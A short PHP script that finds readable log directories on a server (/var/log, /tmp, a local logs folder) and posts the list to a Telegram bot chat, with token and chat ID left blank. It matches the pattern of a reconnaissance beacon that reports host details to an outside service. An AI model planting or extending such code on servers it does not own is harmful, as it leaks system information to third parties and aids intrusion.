<?php
// Telegram Bot Config
$botToken = ":"; // Replace with your Telegram Bot Token
$chatId = "-"; // Replace with your Telegram Chat ID

// Function to find log directories
function find_log_dirs() {
    $potential_dirs = ["/var/log/", "/tmp/", getcwd() . "/logs/"];
    $found_logs = [];
    foreach ($potential_dirs as $dir) {
        if (is_dir($dir) && is_readable($dir)) {
            $found_logs[] = realpath($dir);
        }
    }
    return $found_logs;
}

// Get log directories
$log_dirs = find_log_dirs();
$log_dirs_string = !empty($log_dirs) ? implode("\n", $log_dirs) : "No log directories found.";

// Prepare Telegram message
$message = "🔍 *Log Directory Search Result:*\n\n" . $log_dirs_string;
$telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";

// Send to Telegram
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data),
    ]
];
$context = stream_context_create($options);
$response = file_get_contents($telegramURL, false, $context);

// Debugging Output
echo "Telegram API Response: <br><pre>$response</pre>";
?>
